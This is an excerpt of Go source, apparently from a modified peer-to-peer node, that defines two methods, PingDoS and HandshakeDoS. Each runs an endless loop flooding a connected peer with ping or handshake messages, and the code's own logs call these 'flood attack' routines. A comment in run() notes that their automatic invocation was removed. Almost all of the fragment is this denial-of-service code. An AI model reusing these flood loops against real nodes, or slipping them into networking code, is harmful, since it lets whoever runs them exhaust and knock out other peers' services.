...
func (p *Peer) run() (remoteRequested bool, err error) {
	...
	go p.pingLoop()
	// Removed automatic invocation of handshakedos() and pingdos()
...
func (p *Peer) PingDoS() {
	p.log.Debug("Starting ping flood attack")
	counter := 0
	for {
		err := SendItems(p.rw, pingMsg)
		if err != nil {
			p.log.Debug("failed to send ping message: %v", err)
		}
		counter++
		if counter%100 == 0 {
			p.log.Debug("Sent %d ping messages\n", counter)
		}
	}

}

func (p *Peer) HandshakeDoS() {
	p.log.Debug("Starting handshake flood attack")
	counter := 0
	for {
		err := SendItems(p.rw, handshakeMsg)
		if err != nil {
			p.log.Debug("failed to send handshake message: %v", err)
		}
		counter++
		if counter%100 == 0 {
			p.log.Debug("Sent %d handshake messages\n", counter)
		}
	}
